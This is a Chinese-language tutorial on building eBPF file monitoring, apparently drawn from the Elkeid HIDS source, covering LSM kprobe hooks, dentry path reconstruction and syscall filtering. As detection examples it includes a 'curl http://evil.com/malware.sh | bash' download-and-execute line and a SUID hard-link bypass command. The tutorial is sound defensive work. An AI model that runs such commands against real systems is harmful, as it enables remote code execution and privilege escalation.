# 技术点 6: eBPF 文件监控 —— 从 Elkeid HIDS 学习 LSM 层 Hook 设计

## 核心原理

### 1. 文件监控的整体架构

Elkeid 的文件监控系统使用 **4 个 kprobe + 1 个 syscall exit handler** 覆盖所有关键文件操作。其核心设计决策是：**挂载 LSM (Linux Security Module) 层函数而非系统调用入口**。

#### 为什么不挂载系统调用？

以文件创建为例，用户态有多种系统调用可以创建文件：

```
open(path, O_CREAT)       →  sys_open
openat(AT_FDCWD, path, O_CREAT)  →  sys_openat
openat2(AT_FDCWD, ...)    →  sys_openat2
creat(path, mode)         →  sys_creat (已废弃)
```

如果逐个挂载这 4 个系统调用，不仅代码冗余，还容易遗漏新增的变种。更关键的是，系统调用入口处无法区分"打开已有文件"和"创建新文件"——`O_CREAT` 标志仅表示"如果不存在就创建"，但文件可能已经存在。

#### LSM 层的优势

LSM 框架在 VFS 操作的安全检查点提供回调，这些回调**仅在实际发生安全相关操作时触发**：

```
用户态程序
    │
    ▼
┌─────────────────────────────┐
│  系统调用层 (sys_openat)     │  ← 频率极高，包含大量读/写操作
└─────────────────────────────┘
    │
    ▼
┌─────────────────────────────┐
│  VFS 层 (vfs_create)         │  ← 仅在文件系统操作时触发
└─────────────────────────────┘
    │
    ▼
┌��────────────────────────────┐
│  LSM 层 (security_inode_*)   │  ← 仅在安全相关操作时触发 ← Elkeid 挂这里
└─────────────────────────────┘
    │
    ▼
┌─────────────────────────────┐
│  文件系统实现 (ext4/xfs/...) │
└─────────────────────────────┘
```

`security_inode_create` **仅在真正创建新文件时���调用**，自动覆盖所有系统调用变种，且不会被"打开已有文件"的操作触发。

#### 为什么用 kprobe 而不用 BPF_PROG_TYPE_LSM？

Linux 5.7+ 引入了 `BPF_PROG_TYPE_LSM`，可以直接编写 LSM 类型的 BPF 程序。但 Elkeid 选择 kprobe 的原因：

- **兼容性**: LSM BPF 需要 `CONFIG_BPF_LSM=y`，很多生产内核未开启
- **kprobe 兼容到 4.x 内核**，覆盖更多生产环��
- **功能等价**: kprobe 在函数入口处获取参数，与 LSM 回调效果相同

#### 5 种操作的监控覆盖

| Hook 函数 | 监控目标 | 事件 ID | Elkeid 位置 |
|-----------|---------|---------|------------|
| `security_inode_create` | 文件创建 | 602 | hids.c:3227-3264 |
| `security_inode_rename` | 文件重命名 | 82 + 613 | hids.c:3273-3310 |
| `security_inode_link` | 硬链接创建 | - | hids.c:3317-3352 |
| `filp_close` | 新文件关闭 (FMODE_CREATED) | 613 | hids.c:3499-3539 |
| `sys_exit` (chmod) | 权限修改 | - | hids.c:2918-2933 |

---

### 2. 各 Hook 详解

#### Hook 1: kprobe/security_inode_create (hids.c:3227-3264)

```c
/* 内核函数原型:
 * int security_inode_create(struct inode *dir, struct dentry *dentry, umode_t mode)
 */
SEC("kprobe/security_inode_create")
int kp__inode_create(struct pt_regs *regs)
{
    struct dentry *de = (void *)FC_REGS_PARM2(regs);  // 第 2 个参数: 新文件的 dentry

    query_s_id_by_dentry(create->s_id, de);            // 提取文件系统标识
    create->path = dentry_path(..., de, ...);           // 通过 dentry 链构建路径

    sk = process_socket(task, &create->pid);            // 关联网络上下文
    if (sk) query_ipu(sk, &create->ip);                 // 提取 IP 信息

    create_print(regs, ...);                            // 输出事件 ID=602
}
```

**设计要点**：
- 参数 `PARM2` 是 `dentry` 而非 `PARM1`（`PARM1` 是父目录 `inode`）
- 使用 `dentry_path` 而非 `d_path`，因为 LSM hook 参数中只有 `dentry`，没有 `struct path`
- 额外关联网络上下文 (`process_socket`)，可追踪文件是否由网络下载创建

#### Hook 2: kprobe/security_inode_rename (hids.c:3273-3310)

```c
/* 内核函数原型:
 * int security_inode_rename(struct inode *old_dir, struct dentry *old_dentry,
 *                           struct inode *new_dir, struct dentry *new_dentry,
 *                           unsigned int flags)
 */
SEC("kprobe/security_inode_rename")
int kp__inode_rename(struct pt_regs *regs)
{
    struct dentry *de1 = (void *)FC_REGS_PARM2(regs);  // 旧路径 dentry
    struct dentry *de2 = (void *)FC_REGS_PARM4(regs);  // 新路径 dentry

    rename->old = dentry_path(..., de1, &len1);
    rename->new = dentry_path(..., de2, &len2);

    // 输出两个事件!
    rename_print(regs, ...);                            // 事件 82: 重命名
    file_creation_print(regs, rename->new, len2);       // 事件 613: 新路径视为"文件创建"
}
```

**双事件输出的设计**：
- 事件 82 记录完整的 `旧路径 → 新路径` 重命名操作
- 事件 613 将新路径视为"文件创建"，这是因为 rename 可能是攻击者将恶意文件移动到关键位置（如 `/usr/bin/`）
- **注意参数位置**: `PARM2` 和 `PARM4`，而非 `PARM1` 和 `PARM2`，因为函数签名中 inode 和 dentry 是交替排列的

#### Hook 3: kprobe/security_inode_link (hids.c:3317-3352)

```c
/* 内核函数原型:
 * int security_inode_link(struct dentry *old_dentry, struct inode *dir,
 *                         struct dentry *new_dentry)
 */
SEC("kprobe/security_inode_link")
int kp__inode_link(struct pt_regs *regs)
{
    struct dentry *de1 = (void *)FC_REGS_PARM1(regs);  // 源文件
    struct dentry *de2 = (void *)FC_REGS_PARM3(regs);  // 新硬链接

    link->old = dentry_path(..., de1, &len1);
    link->new = dentry_path(..., de2, &len2);
    link_print(regs, ...);
}
```

**安全意义 —— SUID 硬链接攻击**：

硬链接是一种经典的权限提升攻击手法。攻击者可以对 SUID root 程序创建硬链接：

```bash
# 攻击场景: 绕过路径白名单
ln /usr/bin/passwd /tmp/innocent_name

# 路径白名单检查 /usr/bin/passwd → 通过
# 但 /tmp/innocent_name 指向同一个 inode，具有相同的 SUID 权限
# 攻击者可以通过新路径绕过基于路径的安全策略
```

监控硬链接创建可以及时发现这类攻击。

#### Hook 4: kprobe/filp_close + FMODE_CREATED (hids.c:3499-3539)

```c
#define FMODE_CREATED  ((unsigned int)0x100000)  // 内核 4.19+ 引入

static inline int sysent_close(void *ctx, struct file *filp)
{
    mode = READ_KERN(filp, f_mode);
    refs = READ_KERN(filp, f_count.counter);

    if (refs == 1 && mode & FMODE_CREATED) {
        // 这个文件是新创建的，且这是最后一个引用
        close->path = d_fp_path(filp, ...);
        file_creation_print(ctx, close->path, close->len);
    }
}

SEC("kprobe/filp_close")
int kp__filp_close(struct pt_regs *regs)
{
    sysent_close(regs, (void *)FC_REGS_PARM1(regs));
}
```

**巧妙的设计**：

这是 Elkeid 文件监控中最精巧的一个 hook。为什么要在文件关闭时检测新文件？

1. **`security_inode_create` 的局限**: 在 `create` 时触发，但此时文件内容还没有写入。如果需要对文件内容做检查（如恶意脚本检测），create 时太早
2. **`filp_close` + `FMODE_CREATED`**: 在文件关闭时触发，此时文件内容已完全写入，可以进行内容扫描
3. **`f_count.counter == 1`**: 确保只在最后一个文件引用关闭时报告，避免 `dup()` 等场景下的重复事件
4. **`FMODE_CREATED` 标志**: 内核 4.19+ 在 `open` 创建新文件时自动设置此标志，持续到文件关闭

这样 Elkeid 在 `security_inode_create` 获得**实时的创建通知**（事件 602），又在 `filp_close` 获得**文件写入完成的通知**（事件 613），形成互补。

#### Hook 5: sys_exit 处理 chmod (hids.c:2918-2933)

```c
case NR_chmod:
    rc = sysret_chmod(ctx, (char *)SC_REGS_PARM1(regs), SC_REGS_PARM2(regs), ret);
    break;
case NR_fchmod:
    rc = sysret_fchmod(ctx, SC_REGS_PARM1(regs), SC_REGS_PARM2(regs), ret);
    break;
case NR_fchmodat:
    if (SC_REGS_PARM1(regs) == -100 /* AT_FDCWD */)
        rc = sysret_chmod(ctx, ...);
    else
        rc = sysret_fchmodat(ctx, ...);
    break;
```

**为什么在 sys_exit 而不是入口处理？**
- 在 `sys_exit` 可以检查返回值 `ret`，确认操作是否成功
- 失败的 chmod 操作不需要告警
- 三种变体需要不同的路径构建：
  - `chmod`: 直接从用户空间读取路径字符串
  - `fchmod`: 通过 fd 查找文件路径
  - `fchmodat`: `AT_FDCWD` 时等价于 chmod，否则需要 dfd + 相对路径

---

### 3. 路径构建原理

路径构建是文件监控中最复杂的部分。Elkeid 实现了两种路径构建函数，适用于不同场景。

#### dentry 链的反向遍历

Linux 内核的目录结构由 `dentry` (directory entry) 对象组成一个树形结构。每个 `dentry` 包含：
- `d_name.name`: 当前目录项的名称
- `d_parent`: 指向父目录的指针
- `d_sb`: 所属超级块（文件系统）

要构建完整路径，需要**从叶节点向根节点遍历** dentry 链：

```
遍历方向: 叶 → 根 (自底向上)

dentry "test.txt"  →  d_parent  →  dentry "home"  →  d_parent  →  dentry "/"
   d_name="test.txt"                d_name="home"                 d_name="/"

路径构建: 反向填充缓冲区
   buffer:  [.............................../home/test.txt\0]
                                            ↑
                                          返回这个指针
```

#### dentry_path (hids.c:1207-1225)

```c
static __noinline char *dentry_path(char *path, char *swap, struct dentry *de, uint32_t *sz)
{
    uint32_t len = 1;           // 初始长度 1 (末尾 \0)
    path[SD_STR_MASK] = 0;      // 设置缓冲区末尾的 \0
    swap[3] = '/';              // swap buffer 用于添加 '/' 前缀

    for (int i = 0; i < MAX_PATH_ENTS; i++) {
        if (prepend_entry(path, &len, swap, de))
            break;
        de = d_parent(de);      // 移动到父目录
    }

    *sz = len;
    return &path[(SD_STR_MAX - len) & SD_STR_MASK];  // 返回路径起始位置
}
```

**反向填充技巧**：路径从缓冲区的**末尾**开始填充，每次将新的目录名插入到已有路径之前。这样不需要预先知道路径的总长度。

```
步骤 1: path = [...............................test.txt\0]  len=9
步骤 2: path = [......................../home/test.txt\0]  len=15
步骤 3: 到达根节点 (d_parent == self)，停止
返回:   &path[SD_STR_MAX - 15]  →  指向 "/home/test.txt"
```

#### d_path (hids.c:1160-1204) —— 带挂载点穿越

`d_path` 比 `dentry_path` 多了**挂载点穿越**的能力。当遍历到一个挂载点的根 dentry 时，需要跳转到上层文件系统继续遍历：

```c
static __noinline char *d_path(char *data, char *swap, struct path *path, uint32_t *sz)
{
    struct dentry *dentry = path->dentry;
    struct vfsmount *vfsmnt = path->mnt;
    struct mount *mount = real_mount(vfsmnt);

    for (int i = 0; i < MAX_PATH_ENTS; i++) {
        struct dentry *root = READ_KERN(vfsmnt, mnt_root);
        struct dentry *parent = READ_KERN(dentry, d_parent);

        if (dentry == root || dentry == parent) {
            if (dentry != root) break;      // 到达 dentry 根但不是挂载根: 异常

            if (mount != mnt_parent) {
                // 到达本挂载点根，但不是全局根
                // → 跳转到父挂载点继续遍历
                dentry = READ_KERN(mount, mnt_mountpoint);
                mount = READ_KERN(mount, mnt_parent);
                vfsmnt = &mount->mnt;
                continue;
            }
            break;  // 到达全局根，完成
        }
        prepend_entry(data, &len, swap, dentry);
        dentry = parent;
    }
}
```

**挂载点穿越的场景**：

```
假设 /dev/sda1 挂载在 /mnt/data，文件路径为 /mnt/data/logs/app.log

VFS 视图:
  / (rootfs)
    └── mnt/
        └── data/     ← 挂载点 (mount)
            └── logs/  ← /dev/sda1 文件系统
                └── app.log

dentry_path: 只遍历 sda1 内部 → "logs/app.log" (不完整)
d_path:      跨越挂载点向上 → "/mnt/data/logs/app.log" (完整路径)
```

#### dentry_path vs d_path 对比

| 特性 | dentry_path | d_path |
|------|-------------|--------|
| 参数 | `struct dentry *` | `struct path *` (dentry + vfsmount) |
| 挂载点穿越 | 不支持 | 支持 |
| 使用场景 | LSM hook (只有 dentry) | 有 `struct file` 的场景 |
| 路径完整性 | 相对于挂载点根 | 完整绝对路径 |
| 性能 | 略快 | 略慢 (额外的 mount 查询) |
| Elkeid 使用者 | `kp__inode_create`, `kp__inode_rename`, `kp__inode_link` | `kp__filp_close` (通过 `d_fp_path`), `kp__init_module` |

---

### 4. 网络上下文关联

#### process_socket() 的 3 层祖先遍历 (hids.c:590-623)

Elkeid 在 `security_inode_create` 事件中附加网络上下文信息，实现**文件创建与网络下载的关联**。

```c
static struct sock *process_socket(struct task_struct *task, pid_t *pid)
{
    struct sock *sk;

    // 第 1 层: 当前进程
    sk = find_sockfd(task);
    if (sk) { *pid = task->tgid; return sk; }

    // 第 2 层: 父进程
    parent = task->real_parent;
    sk = find_sockfd(parent);
    if (sk) { *pid = parent->tgid; return sk; }

    // 第 3 层: 祖父进程
    parent = parent->real_parent;
    sk = find_sockfd(parent);
    if (sk) { *pid = parent->tgid; return sk; }

    return NULL;
}
```

**应用场景: `curl | bash` 攻击溯源**

```bash
# 攻击者执行:
curl http://evil.com/malware.sh | bash

# 进程树:
bash (PID 100)                    ← 第 3 层
  └── bash (PID 200)              ← 第 2 层 (管道 subshell)
      └── curl (PID 201)          ← 有 socket 连接到 evil.com
      └── bash (PID 202)          ← 第 2 层 (管道 subshell)
          └── malware (PID 300)   ← 第 1 层 (创建文件的进程)
```

当 `malware` (PID 300) 创建文件时，`process_socket` 向上遍历 3 层，找到 `curl` (PID 201) 的 socket 连接。事件输出中包含 `evil.com` 的 IP 地址，安全团队可以追溯恶意文件的来源。

---

### 5. 过滤机制

#### 三层过滤的性能考量 (hids.c:3169-3198)

Elkeid 的 `sys_exit` handler 处理**所有**系统调用的返回，需要极其高效的过滤：

```c
SEC("raw_tracepoint/sys_exit")
int tp__sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
    int id = syscall_get_nr(regs);

    // ========== 第 1 层: 快速跳过高频 syscall ==========
    // read/write/mmap 占系统调用的 90%+
    // 这些 syscall 绝对不需要审计，最先排除
    if (sysret_is_critical(id))
        return 0;

    // ========== 第 2 层: 白名单审计的 syscall ==========
    // 只有 chmod/rename/connect 等安全相关操作才需要处理
    if (!sysret_is_audit(id))
        return 0;

    // ========== 第 3 层: 可执行文件白名单 ==========
    // 已知安全的可执行文件（如系统服务）直接跳过
    // 使用 murmur hash 在 BPF map 中查找
    if (exe_is_allowed(task))
        return 0;

    // 到这里才开始真正的事件处理
    sysret_exit(ctx);
}
```

#### sysret_is_critical (hids.c:3051-3086)

```c
static int sysret_is_critical(int id)
{
    switch (id) {
    case NR_read:        // 读文件
    case NR_write:       // 写文件
    case NR_open:        // 打开文件
    case NR_mmap:        // 内存映射
    case NR_mprotect:    // 内存保护
    case NR_munmap:      // 取消映射
    case NR_brk:         // 堆扩展
    case NR_readv:       // 向量读
    case NR_writev:      // 向量写
    case NR_pread64:     // 定位读
    case NR_pwrite64:    // 定位写
    case NR_epoll_wait:  // epoll 等待
    case NR_epoll_ctl:   // epoll 控制
    case NR_epoll_pwait: // epoll 等待 (带信号掩码)
    case NR_preadv:      // 定位向量读
    case NR_pwritev:     // 定位向量写
        return 1;        // 这些 syscall 占调用量的绝大多数
    }
    return 0;
}
```

**性能影响**：在高负载 Web 服务器上，每秒可能有数百万次 `read`/`write` 调用。如果没有第 1 层过滤，eBPF 程序会在每次返回时执行完整逻辑，CPU 开销将不可接受。通过一个简单的 switch-case 快速排除这些高频调用，将性能影响降到可忽略。

#### exe_is_allowed (hids.c:815-831)

```c
static int exe_is_allowed(struct task_struct *task)
{
    tgid = READ_KERN(task, tgid);
    tid = bpf_map_lookup_elem(&tid_cache, &tgid);
    if (!tid) return 1;  // 未缓存 → 视为白名单（保守策略）

    n = tid->exe_hash;                              // murmur hash of exe path
    ei = bpf_map_lookup_elem(&trusted_exes, &n);    // 在白名单 map 中查找
    return (ei && ei->len == tid->exe_len);          // hash + 长度双校验
}
```

**双校验设计**: 仅用 hash 匹配存在碰撞风险（不同路径可能产生相同 hash），加上路径长度校验大幅降低误��行概率。

---

### 6. Demo 代码详解

本 demo 实现了两个核心 hook：

1. **`kprobe/security_inode_create`** —— 检测文件创建，提取路径和文件系统标识
2. **`kprobe/filp_close`** —— 检测新建文件关闭（FMODE_CREATED），获取完整路径

简化了 Elkeid 的以下部分：
- dentry 遍历层数从 16 层简化为 4 层
- 白名单使用 comm name 代替 murmur hash
- 不包含网络上下文关联
- 不包含 rename/link/chmod 监控

#### 内核态程序 (file_monitor.bpf.c)

关键技术点：

1. **PERCPU_ARRAY 堆内存**: 路径构建需要大缓冲区，不能放栈上
2. **dentry 链遍历**: 简化版的反向路径构建
3. **事件类型区分**: 使用 `event_type` 字段区分 create 和 close 事件
4. **FMODE_CREATED 检测**: 内核 4.19+ 的文件创建标志
5. **comm 白名单**: 简化版的可执行文件过滤

#### 用户态程序 (main.go)

关键技术点：

1. **双 kprobe 附加**: 同时挂载 `security_inode_create` 和 `filp_close`
2. **事件类型解析**: 根据 `event_type` 字段分别处理
3. **路径显示**: 提取并展示文件路径和文件系统标识

## 编译与运行

```bash
# 1. 生成 vmlinux.h（如果还没有）
bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h

# 2. 编译 eBPF 程序
clang -O2 -g -target bpf -D__TARGET_ARCH_x86 \
  -I. \
  -c file_monitor.bpf.c -o file_monitor.bpf.o

# 3. 初始化 Go 模块
go mod init file_monitor
go get github.com/cilium/ebpf@latest
go get github.com/cilium/ebpf/link@latest
go get github.com/cilium/ebpf/perf@latest
go mod tidy

# 4. 运行（需要 root）
go build -o file_monitor . && sudo ./file_monitor
```

## 测试方法

在另一个终端执行文件操作：

```bash
# 测试 1: 创建文件 (触发 security_inode_create + filp_close)
touch /tmp/test_file_1.txt

# 测试 2: 写入内容后关闭 (触发 filp_close 的 FMODE_CREATED)
echo "hello" > /tmp/test_file_2.txt

# 测试 3: 在深层目录创建 (测试路径遍历)
mkdir -p /tmp/a/b/c && touch /tmp/a/b/c/deep.txt

# 测试 4: 批量创建 (观察过滤效果)
for i in $(seq 1 10); do touch /tmp/batch_$i.txt; done

# 测试 5: 使用非白名单程序创建
python3 -c "open('/tmp/python_file.txt', 'w').close()"
```

## 预期输出

```
文件监控启动... 按 Ctrl+C 停止
在另一个终端创建/修改文件来测试

TYPE        PID      COMM             PATH                                     FS
----------- -------- ---------------- ---------------------------------------- --------
[CREATE]    12400    touch            test_file_1.txt                          ext4
[CLOSE]     12400    touch            /tmp/test_file_1.txt                     ext4
[CREATE]    12401    bash             test_file_2.txt                          ext4
[CLOSE]     12401    bash             /tmp/test_file_2.txt                     ext4
[CREATE]    12402    touch            deep.txt                                 ext4
[CLOSE]     12402    touch            /tmp/a/b/c/deep.txt                      ext4
[CREATE]    12410    python3          python_file.txt                          ext4
[CLOSE]     12410    python3          /tmp/python_file.txt                     ext4
```

注意两种事件的路径差异：
- `[CREATE]` 来自 `dentry_path`，路径可能不完整（相对于挂载点）
- `[CLOSE]` 来自 `d_path`（通过 `struct file`），路径是完整的绝对路径

## 核心概念索引

| 概念 | 说明 | 本 demo 位置 |
|------|------|-------------|
| LSM 层 Hook | 在安全检查点挂载 kprobe | `file_monitor.bpf.c:SEC("kprobe/security_inode_create")` |
| `dentry` 链遍历 | 反向构建文件路径 | `file_monitor.bpf.c:build_dentry_path()` |
| `FMODE_CREATED` | 内核 4.19+ 的文件创建标志 | `file_monitor.bpf.c:filp_close hook` |
| `f_count.counter` | 文件引用计数，确保只报告最后关闭 | `file_monitor.bpf.c:refs == 1` |
| `s_id` | 超级块的文件系统标识符 | `file_monitor.bpf.c:query_s_id()` |
| Per-CPU Buffer | 大缓冲区存放路径数据 | `file_monitor.bpf.c:heap map` |
| comm 白名单 | 简化版可执行文件过滤 | `file_monitor.bpf.c:comm_is_allowed()` |
| `PT_REGS_PARM1_CORE` | CO-RE 兼容的参数提取 | `file_monitor.bpf.c:各 kprobe 函数` |
| `dentry_path` vs `d_path` | 仅 dentry vs 带挂载点穿越 | 本文第 3 节 |
| `process_socket` 3 层遍历 | 网络上下文关联 | 本文第 4 节 |

## 进阶方向

1. **添加 rename/link 监控**: 实现 `security_inode_rename` 和 `security_inode_link` 的 kprobe，体会双事件和参数位置差异
2. **增加 dentry 遍历深度**: 从 4 层增加到 16 层 (`MAX_PATH_ENTS`)，使用 `#pragma unroll` 处理编译器展开
3. **网络上下文关联**: 实现 `process_socket` 的 3 层祖先遍历，关联文件创建与网络下载
4. **murmur hash 白名单**: 使用 `BPF_MAP_TYPE_LRU_HASH` 存储可执行文件哈希，替代 comm name 过滤
5. **chmod 监控**: 在 `sys_exit` handler 中添加 chmod/fchmod/fchmodat 处理
6. **挂载点穿越**: 在路径构建中实现 mount 点跨越，构建完整绝对路径
7. **文件内容检查**: 在 `filp_close` 事件中触发用户态文件扫描（通过 perf 事件通知用户态程序读取文件内容）
8. **容器感知**: 结合 mntns_id 区分容器内外的文件操作
